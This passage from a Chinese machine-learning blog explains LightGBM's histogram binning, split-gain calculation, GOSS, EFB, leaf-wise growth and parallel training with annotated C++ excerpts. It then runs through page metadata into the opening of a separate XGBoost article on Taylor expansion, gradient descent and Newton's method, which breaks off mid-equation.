对于数值型的特征，关键是寻找分割点，关键代码如下，其中max_bin为最大bin的数量： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485std::vector&lt;double&gt; GreedyFindBin(const double* distinct_values, const int* counts, int num_distinct_values, int max_bin, size_t total_cnt, int min_data_in_bin) &#123; // counts为特征取值计数 std::vector&lt;double&gt; bin_upper_bound; CHECK(max_bin &gt; 0); // 特征取值数比max_bin数量少，直接取distinct_values的中点放置 if (num_distinct_values &lt;= max_bin) &#123; bin_upper_bound.clear(); int cur_cnt_inbin = 0; for (int i = 0; i &lt; num_distinct_values - 1; ++i) &#123; cur_cnt_inbin += counts[i]; if (cur_cnt_inbin &gt;= min_data_in_bin) &#123; auto val = Common::GetDoubleUpperBound((distinct_values[i] + distinct_values[i + 1]) / 2.0); if (bin_upper_bound.empty() || !Common::CheckDoubleEqualOrdered(bin_upper_bound.back(), val)) &#123; bin_upper_bound.push_back(val); cur_cnt_inbin = 0; &#125; &#125; &#125; cur_cnt_inbin += counts[num_distinct_values - 1]; bin_upper_bound.push_back(std::numeric_limits&lt;double&gt;::infinity()); &#125; else &#123; // 特征取值比max_bin来得大，说明几个特征取值要共用一个bin if (min_data_in_bin &gt; 0) &#123; max_bin = std::min(max_bin, static_cast&lt;int&gt;(total_cnt / min_data_in_bin)); max_bin = std::max(max_bin, 1); &#125; double mean_bin_size = static_cast&lt;double&gt;(total_cnt) / max_bin; // mean size for one bin int rest_bin_cnt = max_bin; int rest_sample_cnt = static_cast&lt;int&gt;(total_cnt); std::vector&lt;bool&gt; is_big_count_value(num_distinct_values, false); // 标记一个特征取值数超过mean，因为这些特征需要单独一个bin for (int i = 0; i &lt; num_distinct_values; ++i) &#123; if (counts[i] &gt;= mean_bin_size) &#123; is_big_count_value[i] = true; --rest_bin_cnt; rest_sample_cnt -= counts[i]; &#125; &#125; //剩下的特征取值中平均每个bin的取值个数 mean_bin_size = static_cast&lt;double&gt;(rest_sample_cnt) / rest_bin_cnt; std::vector&lt;double&gt; upper_bounds(max_bin, std::numeric_limits&lt;double&gt;::infinity()); std::vector&lt;double&gt; lower_bounds(max_bin, std::numeric_limits&lt;double&gt;::infinity()); int bin_cnt = 0; lower_bounds[bin_cnt] = distinct_values[0]; int cur_cnt_inbin = 0; for (int i = 0; i &lt; num_distinct_values - 1; ++i) &#123; if (!is_big_count_value[i]) &#123; rest_sample_cnt -= counts[i]; &#125; cur_cnt_inbin += counts[i]; // need a new bin，当前的特征如果是需要单独成一个bin，或者当前几个特征计数超过了mean_bin_size，或者下一个是需要独立成列的 if (is_big_count_value[i] || cur_cnt_inbin &gt;= mean_bin_size || (is_big_count_value[i + 1] &amp;&amp; cur_cnt_inbin &gt;= std::max(1.0, mean_bin_size * 0.5f))) &#123; upper_bounds[bin_cnt] = distinct_values[i]; // 第i个bin的最大就是 distinct_values[i]了 ++bin_cnt; lower_bounds[bin_cnt] = distinct_values[i + 1]; //下一个bin的最小就是distinct_values[i + 1]，注意先++bin了 if (bin_cnt &gt;= max_bin - 1) &#123; break; &#125; cur_cnt_inbin = 0; if (!is_big_count_value[i]) &#123; --rest_bin_cnt; mean_bin_size = rest_sample_cnt / static_cast&lt;double&gt;(rest_bin_cnt); &#125; &#125; &#125; ++bin_cnt; // update bin upper bound bin_upper_bound.clear(); for (int i = 0; i &lt; bin_cnt - 1; ++i) &#123; auto val = Common::GetDoubleUpperBound((upper_bounds[i] + lower_bounds[i + 1]) / 2.0); if (bin_upper_bound.empty() || !Common::CheckDoubleEqualOrdered(bin_upper_bound.back(), val)) &#123; bin_upper_bound.push_back(val); &#125; &#125; // last bin upper bound bin_upper_bound.push_back(std::numeric_limits&lt;double&gt;::infinity()); &#125; return bin_upper_bound; &#125; 上述的代码找到了数值型特征取值的各个bin的切分点，即bin_upper_bound，之后只需要根据这个对特征的取值查找其相应的bin中即可（用二分搜索）。 类别特征 对于类别特征来说，主要代码如下： 1234567891011121314151617181920212223242526272829303132// sort by countsCommon::SortForPair&lt;int, int&gt;(counts_int, distinct_values_int, 0, true);// avoid first bin is zeroif (distinct_values_int[0] == 0) &#123; if (counts_int.size() == 1) &#123; counts_int.push_back(0); distinct_values_int.push_back(distinct_values_int[0] + 1); &#125; std::swap(counts_int[0], counts_int[1]); std::swap(distinct_values_int[0], distinct_values_int[1]);&#125;// will ignore the categorical of small countsint cut_cnt = static_cast&lt;int&gt;((total_sample_cnt - na_cnt) * 0.99f);size_t cur_cat = 0;categorical_2_bin_.clear();bin_2_categorical_.clear();num_bin_ = 0;int used_cnt = 0;max_bin = std::min(static_cast&lt;int&gt;(distinct_values_int.size()), max_bin);cnt_in_bin.clear();while (cur_cat &lt; distinct_values_int.size() &amp;&amp; (used_cnt &lt; cut_cnt || num_bin_ &lt; max_bin)) &#123; if (counts_int[cur_cat] &lt; min_data_in_bin &amp;&amp; cur_cat &gt; 1) &#123; break; &#125; bin_2_categorical_.push_back(distinct_values_int[cur_cat]); categorical_2_bin_[distinct_values_int[cur_cat]] = static_cast&lt;unsigned int&gt;(num_bin_); used_cnt += counts_int[cur_cat]; cnt_in_bin.push_back(counts_int[cur_cat]); ++num_bin_; ++cur_cat;&#125; 关键点有： 首先对特征取值按出现的次数排序（大到小）, 取前min(max_bin, distinct_values_int.size())中的每个特征做第3步（这样可能忽略一些出现次数很少的特征取值）： 然后用\\(bin\\_2\\_categorical\\_\\)（vector类型）记录b对应的特征取值，以及用\\(categorical\\_2\\_bin\\_\\)(unordered_map类型) 将特征取值到哪个bin和一一对应起来。这样，以后就能很方便的进行bin到特征取值和特征取值到bin的转化。 构建直方图 给定一个特征的取值，我们现在已经可以转化为对应的bin了。现在我们就可以构建直方图了。 代码如下： 123456789101112131415161718192021222324252627282930313233void ConstructHistogram(const data_size_t* data_indices, data_size_t num_data, const score_t* ordered_gradients, const score_t* ordered_hessians, HistogramBinEntry* out) const override &#123; const data_size_t rest = num_data &amp; 0x3; data_size_t i = 0; for (; i &lt; num_data - rest; i += 4) &#123; const VAL_T bin0 = data_[data_indices[i]]; const VAL_T bin1 = data_[data_indices[i + 1]]; const VAL_T bin2 = data_[data_indices[i + 2]]; const VAL_T bin3 = data_[data_indices[i + 3]]; out[bin0].sum_gradients += ordered_gradients[i]; out[bin1].sum_gradients += ordered_gradients[i + 1]; out[bin2].sum_gradients += ordered_gradients[i + 2]; out[bin3].sum_gradients += ordered_gradients[i + 3]; out[bin0].sum_hessians += ordered_hessians[i]; out[bin1].sum_hessians += ordered_hessians[i + 1]; out[bin2].sum_hessians += ordered_hessians[i + 2]; out[bin3].sum_hessians += ordered_hessians[i + 3]; ++out[bin0].cnt; ++out[bin1].cnt; ++out[bin2].cnt; ++out[bin3].cnt; &#125; for (; i &lt; num_data; ++i) &#123; const VAL_T bin = data_[data_indices[i]]; out[bin].sum_gradients += ordered_gradients[i]; out[bin].sum_hessians += ordered_hessians[i]; ++out[bin].cnt; &#125;&#125; 可以看到，累加了一阶和二阶梯度，同时还累加了梯度的和还有个数。（当然还有其它的版本，当\\(\\bf is\\_constant\\_hessian\\)为true的时候是不用二阶梯度的） 寻找最优切分点 对每个特征都构建好直方图后，就可以进行最优切分点的构建了。 遍历所有的特征，对于每个特征调用FindBestThreshold如下函数： 123456void FindBestThreshold(double sum_gradient, double sum_hessian, data_size_t num_data, double min_constraint, double max_constraint, SplitInfo* output) &#123; output-&gt;default_left = true; output-&gt;gain = kMinScore; find_best_threshold_fun_(sum_gradient, sum_hessian + 2 * kEpsilon, num_data, min_constraint, max_constraint, output); output-&gt;gain *= meta_-&gt;penalty;&#125; 同样的，对于数值型和类型特征，处理方法find_best_threshold_fun_是不一样的。 在讲具体做法前，首先讲一个Trick，可以加速直方图计算过程，即直方图做差加速。 直方图做差加速 直方图算法还可以进一步加速：一个叶子节点的直方图可以由它的父亲节点的直方图与其兄弟的直方图做差得到。 LightGBM-histogram-subtraction 原来构造直方图，需要遍历该叶子上的所有数据，但直方图做差仅需遍历直方图的#bin个桶。使用这个方法，构建完一个叶子的直方图后，可以用非常微小的代价得到它兄弟的直方图，相当于速度提升了一倍。 数值型特征 对于数值型特征，find_best_threshold_fun_函数如下（我去除了一些if条件，这里只是为了说明计算过程）: 123456789101112void FindBestThresholdNumerical(double sum_gradient, double sum_hessian, data_size_t num_data, double min_constraint, double max_constraint, SplitInfo* output) &#123; is_splittable_ = false; double gain_shift = GetLeafSplitGain(sum_gradient, sum_hessian, meta_-&gt;config-&gt;lambda_l1, meta_-&gt;config-&gt;lambda_l2, meta_-&gt;config-&gt;max_delta_step); double min_gain_shift = gain_shift + meta_-&gt;config-&gt;min_gain_to_split; FindBestThresholdSequence(sum_gradient, sum_hessian, num_data, min_constraint, max_constraint, min_gain_shift, output, -1, true, false); FindBestThresholdSequence(sum_gradient, sum_hessian, num_data, min_constraint, max_constraint, min_gain_shift, output, 1, true, false); output-&gt;gain -= min_gain_shift; output-&gt;monotone_type = meta_-&gt;monotone_type; output-&gt;min_constraint = min_constraint; output-&gt;max_constraint = max_constraint; &#125; 可以看到FindBestThresholdSequence被调用了两次，分别是从左到右和从右向左，类似XGBoost的缺失值自动寻找划分方向。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253void FindBestThresholdSequence(double sum_gradient, double sum_hessian, data_size_t num_data, double min_constraint, double max_constraint, double min_gain_shift, SplitInfo* output, int dir, bool skip_default_bin, bool use_na_as_missing) &#123; const int8_t bias = meta_-&gt;bias; double best_sum_left_gradient = NAN; double best_sum_left_hessian = NAN; double best_gain = kMinScore; data_size_t best_left_count = 0; uint32_t best_threshold = static_cast&lt;uint32_t&gt;(meta_-&gt;num_bin); if (dir == -1) &#123; // from right to left ....... &#125; else &#123; // from left to right double sum_left_gradient = 0.0f; double sum_left_hessian = kEpsilon; data_size_t left_count = 0; int t = 0; const int t_end = meta_-&gt;num_bin - 2 - bias; for (; t &lt;= t_end; ++t) &#123; sum_left_gradient += data_[t].sum_gradients; sum_left_hessian += data_[t].sum_hessians; left_count += data_[t].cnt; data_size_t right_count = num_data - left_count; double sum_right_hessian = sum_hessian - sum_left_hessian; double sum_right_gradient = sum_gradient - sum_left_gradient; // current split gain double current_gain = GetSplitGains(sum_left_gradient, sum_left_hessian, sum_right_gradient, sum_right_hessian, meta_-&gt;config-&gt;lambda_l1, meta_-&gt;config-&gt;lambda_l2, meta_-&gt;config-&gt;max_delta_step, min_constraint, max_constraint, meta_-&gt;monotone_type); // gain with split is worse than without split if (current_gain &lt;= min_gain_shift) continue; // mark to is splittable is_splittable_ = true; // better split point if (current_gain &gt; best_gain) &#123; best_left_count = left_count; best_sum_left_gradient = sum_left_gradient; best_sum_left_hessian = sum_left_hessian; best_threshold = static_cast&lt;uint32_t&gt;(t + bias); best_gain = current_gain; &#125; &#125; &#125; if (is_splittable_ &amp;&amp; best_gain &gt; output-&gt;gain) &#123; // update split output information ..... &#125; &#125; 而这个关键的GetSplitGains是什么呢？ 12345678910111213static double GetSplitGains(double sum_left_gradients, double sum_left_hessians, double sum_right_gradients, double sum_right_hessians, double l1, double l2, double max_delta_step, double min_constraint, double max_constraint, int8_t monotone_constraint) &#123; double left_output = CalculateSplittedLeafOutput(sum_left_gradients, sum_left_hessians, l1, l2, max_delta_step, min_constraint, max_constraint); double right_output = CalculateSplittedLeafOutput(sum_right_gradients, sum_right_hessians, l1, l2, max_delta_step, min_constraint, max_constraint); if (((monotone_constraint &gt; 0) &amp;&amp; (left_output &gt; right_output)) || ((monotone_constraint &lt; 0) &amp;&amp; (left_output &lt; right_output))) &#123; return 0; &#125; return GetLeafSplitGainGivenOutput(sum_left_gradients, sum_left_hessians, l1, l2, left_output) + GetLeafSplitGainGivenOutput(sum_right_gradients, sum_right_hessians, l1, l2, right_output); &#125; 而第一个调用的函数如下（其实就是类似XGBoost的最优叶子节点输出：\\(w_j = – \\frac{G_j}{H_j+\\lambda}\\)）： 12345678910static double CalculateSplittedLeafOutput(double sum_gradients, double sum_hessians, double l1, double l2, double max_delta_step, double min_constraint, double max_constraint) =&gt; 调用：static double CalculateSplittedLeafOutput(double sum_gradients, double sum_hessians, double l1, double l2, double max_delta_step) &#123; double ret = -ThresholdL1(sum_gradients - l1) / (sum_hessians + l2); if (max_delta_step &lt;= 0.0f || std::fabs(ret) &lt;= max_delta_step) &#123; return ret; &#125; else &#123; return Common::Sign(ret) * max_delta_step; &#125;&#125; 得到了叶子结点输出后，GetLeafSplitGainGivenOutput其实就是左右子树累加起来，\\(G_jw_j + \\frac{1}{2} (H_j + \\lambda) w_j^2\\)：和XGBoost一样。 1234static double GetLeafSplitGainGivenOutput(double sum_gradients, double sum_hessians, double l1, double l2, double output) &#123; const double sg_l1 = ThresholdL1(sum_gradients, l1); return -(2.0 * sg_l1 * output + (sum_hessians + l2) * output * output); &#125; 注意到上面的增益计算出来是左子树+右子树，然后和min_gain_shift比较，而XGBoost是如下形式: \\[ Gain = \\frac{1}{2}[\\underbrace{\\frac{G_L^2}{H_L+\\lambda}}_{左子树分数} + \\underbrace{\\frac{G_R^2}{H_R+\\lambda}}_{右子树分数} – \\underbrace{\\frac{(G_L+G_R)^2}{H_L+H_R+\\lambda}}_{分裂前分数}] – \\underbrace{\\gamma}_{新叶节点复杂度} \\] 难道不一样？其实是一样的，min_gain_shift计算方式一开始的代码就给出了，即： 123double gain_shift = GetLeafSplitGain(sum_gradient, sum_hessian, meta_-&gt;config-&gt;lambda_l1, meta_-&gt;config-&gt;lambda_l2, meta_-&gt;config-&gt;max_delta_step);double min_gain_shift = gain_shift + meta_-&gt;config-&gt;min_gain_to_split; 就是分裂前的分数！ 因此，是和XGBoost一样的。 直方图算法小结 可以看出，直方图算法的有点有： 可以减少内存占用，比如离散为256个Bin时，只需要用8位整形就可以保存一个样本被映射为哪个Bin(这个bin可以说就是转换后的特征)，对比预排序的Exact greedy算法来说（用int_32来存储索引+ 用float_32保存特征值），可以节省7/8的空间。 计算效率也得到提高，预排序的Exact greedy对每个特征都需要遍历一遍数据，并计算增益，复杂度为\\(O(\\#feature \\times \\#data)\\)。而直方图算法在建立完直方图后，只需要对每个特征遍历直方图即可，复杂度为\\(O(\\#feature \\times \\#bins)\\)。 提高缓存命中率，因为它访问梯度是连续的（直方图）。 此外，在数据并行的时候，直方图算法可以大幅降低通信代价。（数据并行、特征并行在本文后面讲解） 当然也有不够精确的缺点： 当然，Histogram算法并不是完美的。由于特征被离散化后，找到的并不是很精确的分割点，所以会对结果产生影响。但在不同的数据集上的结果表明，离散化的分割点对最终的精度影响并不是很大，甚至有时候会更好一点。原因是决策树本来就是弱模型，分割点是不是精确并不是太重要；较粗的分割点也有正则化的效果，可以有效地防止过拟合；即使单棵树的训练误差比精确分割的算法稍大，但在梯度提升（Gradient Boosting）的框架下没有太大的影响。 直方图算法改进 直方图算法仍有优化的空间，建立直方图的复杂度为\\(O(\\#feature \\times \\#data)\\)，如果能降低特征数或者降低样本数，训练的时间会大大减少。以往的降低样本数的方法中，要么不能直接用在GBDT上，要么会损失精度。而降低特征数的直接想法是去除弱的特征（通常用PCA完成），然而，这些方法往往都假设特征是有冗余的，然而通常特征是精心设计的，去除它们中的任何一个可能会影响训练精度。因此LightGBM提出了GOSS算法和EFB算法。 Gradient-based One-Side Sampling（GOSS） 在AdaBoost中，权重向量w很好的反应了样本的重要性。而在GBDT中，则没有这样的直接权重来反应样本的重要程度。但是梯度是一个很好的指标，如果一个样本的梯度很小，说明该样本的训练误差很小，或者说该样本已经得到了很好的训练(well-trained)。 要减少样本数，一个直接的想法是抛弃那些梯度很小的样本，但是这样训练集的分布会被改变，可能会使得模型准确率下降。LightGBM提出 Gradient-based One-Side Sampling (GOSS)来解决这个问题。 GOSS的做法伪代码描述如下： LightGBM-Gradient-based-One-Side-Sampling 即： 根据梯度的绝对值将样本进行降序排序 选择前\\(a \\times100\\%\\)的样本，这些样本称为A 剩下的数据\\((1-a) \\times100\\%\\) 的数据中，随机抽取\\(b \\times100\\%\\)的数据，这些样本称为B 在计算增益的时候，放大样本B中的梯度\\((1-a) / b\\) 倍 关于g，在具体的实现中是一阶梯度和二阶梯度的乘积，见Github的实现（ LightGBM/src/boosting/goss.hpp） 使用GOSS进行采样，使得训练算法更加的关注没有充分训练(under-trained)的样本，并且只会稍微的改变原有的数据分布。 原有的在特征j值为d处分数据带来的增益可以定义为： \\[ V_{j|O}(d) = \\frac{1}{n_O}\\left(\\frac{(\\sum_{x_i\\in O:x_{ij} \\le d}g_i)^2}{n_{l|O}^j(d)} + \\frac{(\\sum_{x_i\\in O:x_{ij} \\gt d}g_i)^2}{n_{r|O}^j(d)} \\right) \\] 其中： O为在决策树待分裂节点的训练集 \\(n_o = \\sum I(x_i \\in O)\\) \\(n_{l|O}^j(d) = \\sum I[x_i \\in O: x_{ij} \\le d]\\ and\\ n_{r|O}^j(d) = \\sum I[x_i \\in O: x_{ij} \\gt d]\\) 而使用GOSS后，增益定义为： \\[ V_{j|O}(d) = \\frac{1}{n_O}\\left(\\frac{(\\sum_{x_i\\in A_l} g_i + \\frac{1-a}{b} \\sum_{x_i\\in B_l} g_i)^2 }{n_{l}^j(d)} + \\frac{(\\sum_{x_i\\in A_r} g_i + \\frac{1-a}{b} \\sum_{x_i\\in B_l} g_r)^2 }{n_{r}^j(d)} \\right) \\] 其中: \\(A_l = \\{x_i \\in A: x_{ij} \\le d\\}, A_r = \\{x_i \\in A: x_{ij} \\gt d\\}\\) \\(B_l = \\{x_i \\in B: x_{ij} \\le d\\}, B_r = \\{x_i \\in B: x_{ij} \\gt d\\}\\) Exclusive Feature Bundling（EFB） 一个有高维特征空间的数据往往是稀疏的，而稀疏的特征空间中，许多特征是互斥的。所谓互斥就是他们从来不会同时具有非0值（一个典型的例子是进行One-hot编码后的类别特征）。 LightGBM利用这一点提出Exclusive Feature Bundling（EFB）算法来进行互斥特征的合并，从而减少特征的数目。做法是先确定哪些互斥的特征可以合并（可以合并的特征放在一起，称为bundle），然后将各个bundle合并为一个特征。 这样建立直方图的时间将从\\(O(\\#feature \\times \\#data)\\)变为\\(O(\\#bundle \\times \\#data)\\)，而\\(\\#bundle &lt;&lt; \\#feature\\)，这样GBDT能在精度不损失的情况下进一步提高训练速度。 那么，问题来了： 如何判断哪里特征应该放在一个Bundle中？ 如何将bundle中的特征合并为一个新的特征？ Greedy bundle 对于第1个问题，将特征划分为最少数量的互斥的bundle是NP问题（可以根据图着色问题来证明）。 因此，同样采用近似算法。我们可以构建一张图，图上的顶点代表特征，若两个特征不互斥，则在他们之间连一条边。 更进一步的，通常有少量的特征，它们之间并非完全的独立，但是绝大多数情况下，并不会同时取非0值。若构建Bundle的算法允许小的冲突，就能得到更少数的bundle，进一步提高效率。可以证明，随机的污染一部分特征则最多影响精度\\(O([1-\\gamma]n)^{-2/3}\\), \\(\\gamma\\)为最大的特征冲突率，也是在速度和精度之间达到平衡的有效手段。 因此，LightGBM的构建bundle算法描述如下（算法3）： LightGBM-greedy-bundling 即： 构造带权图G，边的权重代表两个feature之间冲突的数量 对特征按度降序排序 按顺序对排好序的特征进行遍历，对于当前特征i，查看是否能加入已有的bundle（冲突要小），若不行，则新建一个bundle 上述的算法复杂度为\\(O(\\#feature^2)\\)，当特征数很大的时候，仍然效率不高。 算法3可以进一步优化：不建立图，直接按特征的非0值的个数进行排序。（这也是一种贪心，非0值越多，越可能冲突）。 Merge Exclusive Features 现在来回答第2个问题，我们已经有了一个个的bundle，如何将bundle中的特征合并为一个新的特征呢？ 回想起在直方图算法中，我们将连续的特征变为一个个离散的bins值，这是以特征为粒度的，即一个特征一张直方图。而合并后，一个很关键的点是合并后原本不同特征的值要有所体现，这样在新的特征中遍历直方图才能相当于遍历原来好几个直方图，从而找到切分点。 这可以通过对原始特征的值添加偏移来实现，从而将互斥的特征放在不同的bins中。例如，一个Bundle中有两个特征A和B，\\(A \\in [0,10),\\ B \\in [0,20)\\)，可以给特征B添加偏移量10，使得B的值域范围变为\\(B \\in [10,30)\\)，然后，A和B就可以合并成值域为\\([0,30]\\)新特征。这就是Merge Exclusive Features（MEF）算法。 伪代码描述如下： LightGBM-merge-exclusive-features 通过MEF算法，将许多互斥的稀疏特征转化为稠密的特征，降低了特征的数量，提高了建直方图的效率。 树的生长策略 在XGBoost中，树是按层生长的，称为Level-wise tree growth，同一层的所有节点都做分裂，最后剪枝，如下图所示： LightGBM-level-wise-tree-growth Level-wise过一次数据可以同时分裂同一层的叶子，容易进行多线程优化，也好控制模型复杂度，不容易过拟合。但实际上Level-wise是一种低效的算法，因为它不加区分的对待同一层的叶子，带来了很多没必要的开销，因为实际上很多叶子的分裂增益较低，没必要进行搜索和分裂。 而LightGBM采用的是Leaf-wise tree growth： Leaf-wise则是一种更为高效的策略，每次从当前所有叶子中，找到分裂增益最大的一个叶子，然后分裂，如此循环。因此同Level-wise相比，在分裂次数相同的情况下，Leaf-wise可以降低更多的误差，得到更好的精度。Leaf-wise的缺点是可能会长出比较深的决策树，产生过拟合。因此LightGBM在Leaf-wise之上增加了一个最大深度的限制，在保证高效率的同时防止过拟合。 LightGBM-leaf-wise-tree-growth 并行计算 本小节主要根据LightGBM的官方文档中提到的并行计算优化进行讲解。 在本小节中，工作的节点称为worker 特征并行 特征并行主要是并行化决策树中寻找最优划分点(“Find Best Split”)的过程，因为这部分最为耗时。 传统算法 传统算法的做法如下： 垂直划分数据（对特征划分），不同的worker有不同的特征集 每个workers找到局部最佳的切分点{feature, threshold} workers使用点对点通信，找到全局最佳切分点 具有全局最佳切分点的worker进行节点分裂，然后广播切分后的结果（左右子树的instance indices） 其它worker根据收到的instance indices也进行划分 LightGBM-feature-parallelization 传统算法的缺点是： 无法加速split的过程，该过程复杂度为\\(O(\\#data)\\)，当数据量大的时候效率不高 需要广播划分的结果（左右子树的instance indices），1条数据1bit的话，大约需要花费\\(O(\\#data / 8)\\) LightGBM中的特征并行 每个worker保存所有的数据集，这样找到全局最佳切分点后各个worker都可以自行划分，就不用进行广播划分结果，减小了网络通信量。过程如下： 每个workers找到局部最佳的切分点{feature, threshold} workers使用点对点通信，找到全局最佳切分点 每个worker根据全局全局最佳切分点进行节点分裂 但是这样仍然有缺点： split过程的复杂度仍是\\(O(\\#data)\\)，当数据量大的时候效率不高 每个worker保存所有数据，存储代价高 数据并行 传统算法 数据并行目标是并行化整个决策学习的过程： 水平切分数据，不同的worker拥有部分数据 每个worker根据本地数据构建局部直方图 合并所有的局部直方图得到全部直方图 根据全局直方图找到最优切分点并进行分裂 LightGBM-data-parallelization 在第3步中，有两种合并的方式： 采用点对点方式(point-to-point communication algorithm)进行通讯，每个worker通讯量为\\(O(\\#machine * \\#feature * \\#bin)\\) 采用collective communication algorithm(如“All Reduce”)进行通讯（相当于有一个中心节点，通讯后在返回结果），每个worker的通讯量为\\(O(2 * \\#feature * \\#bin)\\) 可以看出通信的代价是很高的，这也是数据并行的缺点。 LightGBM中的数据并行 使用“Reduce Scatter”将不同worker的不同特征的直方图合并，然后workers在局部合并的直方图中找到局部最优划分，最后同步全局最优划分。 前面提到过，可以通过直方图作差法得到兄弟节点的直方图，因此只需要通信一个节点的直方图。 通过上述两点做法，通信开销降为\\(O(0.5 * \\#feature * \\#bin)\\) Voting Parallel LightGBM采用一种称为PV-Tree的算法进行投票并行(Voting Parallel)，其实这本质上也是一种数据并行。 PV-Tree和普通的决策树差不多，只是在寻找最优切分点上有所不同。 其算法伪代码描述如下： LightGBM-pv-tree 水平切分数据，不同的worker拥有部分数据。 Local voting: 每个worker构建直方图，找到top-k个最优的本地划分特征 Global voting: 中心节点聚合得到最优的top-2k个全局划分特征（top-2k是看对各个worker选择特征的个数进行计数，取最多的2k个） Best Attribute Identification： 中心节点向worker收集这top-2k个特征的直方图，并进行合并，然后计算得到全局的最优划分 中心节点将全局最优划分广播给所有的worker，worker进行本地划分。 LightGBM-voting-parallelization 可以看出，PV-tree将原本需要\\(\\#feature \\times \\#bin\\) 变为了\\(2k \\times \\#bin\\)，通信开销得到降低。此外，可以证明，当每个worker的数据足够多的时候，top-2k个中包含全局最佳切分点的概率非常高。 小结 LightGBM 和 XGBoost对比如下： LightGBM-VS-XGBoost 参考资料 Guolin Ke, Qi Meng, Thomas Finley, Taifeng Wang, Wei Chen, Weidong Ma, Qiwei Ye, and Tie-Yan Liu. \"LightGBM: A Highly Efficient Gradient Boosting Decision Tree\". In Advances in Neural Information Processing Systems (NIPS), pp. 3149-3157. 2017. Qi Meng, Guolin Ke, Taifeng Wang, Wei Chen, Qiwei Ye, Zhi-Ming Ma, Tieyan Liu. \"A Communication-Efficient Parallel Algorithm for Decision Tree\". Advances in Neural Information Processing Systems 29 (NIPS 2016). GBDT算法原理与系统设计简介 - weapon GBDT详解 - 火光摇曳 开源 | LightGBM：三天内收获GitHub 1000 星 如何玩转LightGBM LightGBM github地址","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"}]},{"title":"『我爱机器学习』集成学习（三）XGBoost","slug":"machine-learning-xgboost","date":"2018-05-20T01:18:34.000Z","updated":"2020-10-19T14:35:48.809Z","comments":true,"path":"machine-learning-xgboost/","link":"","permalink":"https://www.hrwhisper.me/machine-learning-xgboost/","excerpt":"如果你打过诸如Kaggle、天池等数据挖掘的比赛，XGBoost的威名想必你也有所耳闻。 本文将详细介绍XGBoost相关内容，包括但不限于 泰勒公式 XGBoost的推导 XGBoost为什么快","text":"如果你打过诸如Kaggle、天池等数据挖掘的比赛，XGBoost的威名想必你也有所耳闻。 本文将详细介绍XGBoost相关内容，包括但不限于 泰勒公式 XGBoost的推导 XGBoost为什么快 泰勒公式 在介绍XGBoost前，首先要介绍一下泰勒公式，因为在之后的推导中会用到。假如你已经掌握，可以跳过本小节。 泰勒公式（Taylor's Formula）是一个用函数在某点的信息描述其附近取值的公式。其初衷是用多项式来近似表示函数在某点周围的情况。 比如在SVM的高斯核函数中，我们就用到了\\(e^x\\)在x=0处的展开：\\(e^x = \\sum_{n=0}^{\\infty} \\frac{x^n}{n!}\\) 。当然这个公式只对0附近的x有用，x离0越远，这个公式就越不准确。实际函数值和多项式的偏差称为泰勒公式的余项。 对于一般的函数，泰勒公式的系数的选择依赖于函数在一点的各阶导数值。函数\\(f(x)\\)在\\(x_0\\)处的基本形式如下： \\[ \\begin{align*} f(x) &amp;= \\sum_{n=0}^\\infty\\frac{f^{(n)}(x_0)}{n!}(x-x_0)^n \\tag{1-1} \\\\&amp;= f(x_0) +f^{1}(x_0)(x-x_0)+ \\frac{f^{2}(x_0)}{2}(x-x_0)^2 + \\cdots + \\frac{f^{(n)}(x_0)}{n!}(x-x_0)^n \\end{align*} \\] 还有另外一种常见的写法，\\(x^{t+1} = x^t + \\Delta x\\)，将\\(f(x^{t+1})\\)在\\(x^t\\)处进行泰勒展开，得： \\[ \\begin{align*} f(x^{t+1}) &amp;= f(x^t) +f^{1}(x^t)\\Delta x+ \\frac{f^{2}(x^t)}{2}\\Delta x^2 + \\cdots \\end{align*} \\] 如果你想更直观的了解泰勒公式，可以查看：如何通俗地解释泰勒公式？ – 马同学的回答 梯度下降法 梯度下降法其实可以泰勒公式来表示。假设要最小化损失函数\\(L(w)\\), 我们知道，梯度下降法的过程为： 选取初值\\(w^0\\) 迭代更新\\(w^{t+ 1} = w^{t} - \\eta L&#39;(w)\\) 其中，\\(\\eta\\)为学习率，一般设定为一个小的数，如0.1，当然，还有其它的可以变化的学习率的方式。 为什么这样是对的呢？用泰勒公式在\\(w^{t}\\)处一阶展开则可以表示为 \\[ \\begin{align*} L(w^{t + 1}) &amp;=L(w^{t}) + L&#39;(w^{t})(w^{t+1} - w^t) + R \\hspace{5ex} &amp; R为残差项\\\\ &amp;\\approx L(w^{t}) + L&#39;(w^{t})(w^{t+1} - w^t) &amp; 当(w^{t+1} - w^t) 较小的时候，R \\approx0 \\\\ &amp;= L(w^{t}) + \\eta v L&#39;(w^{t}) &amp; 设w^{t+1} - w^t = \\eta v, \\eta为学习率，v则为单位向量\\\\ \\end{align*} \\] 要使得迭代后损失函数变小，即\\(L(w^{t+1}) \\lt L(w^{t})\\)，回想向量相乘的公式，\\(|\\!|v|\\!|\\cdot|\\!|L&#39;(w^t)|\\!|\\cdot cos\\theta\\), 则我们可以令v和\\(L&#39;(w^{t})\\)反向，这样可以让他们向量乘积最小，于是 \\[ v = - \\frac{L&#39;(w^t)}{|\\!|L&#39;(w^t)|\\!|} \\] 于是 \\[ \\begin{align*} w^{t+1} = w^{t} -\\eta \\frac{L&#39;(w^t)}{|\\!|L&#39;(w^t)|\\!|} \\end{align*} \\] 又因为\\(|\\!|L&#39;(w^t)|\\!|\\)为标量，可以并入\\(\\eta\\)中，即简化为： \\[ \\begin{align*} w^{t+1} = w^{t} -\\eta L&#39;(w^t)\\tag{1-2} \\end{align*} \\] 牛顿法 牛顿法其实是泰勒公式在\\(w^{t}\\)处二阶展开，即 \\[ L(w^{t+1}) \\approx L(w^{t}) + L&#39;(w^{t})(w^{t+1} - w^t) + \\frac{L&#39;&#39;(w^{t})}{2}(w^{t+1} - w^t) ^2 \\tag{1-3} \\] 假设参数w为一维向量，若\\(L(w^{t+1})\\)极小，必然有其一阶导数为0，因此可以让L对\\(w^{t+1}\\)求偏导得 \\[ \\frac{\\partial L}{\\partial w^{t+1}} = L&#39;(w^{t})+ 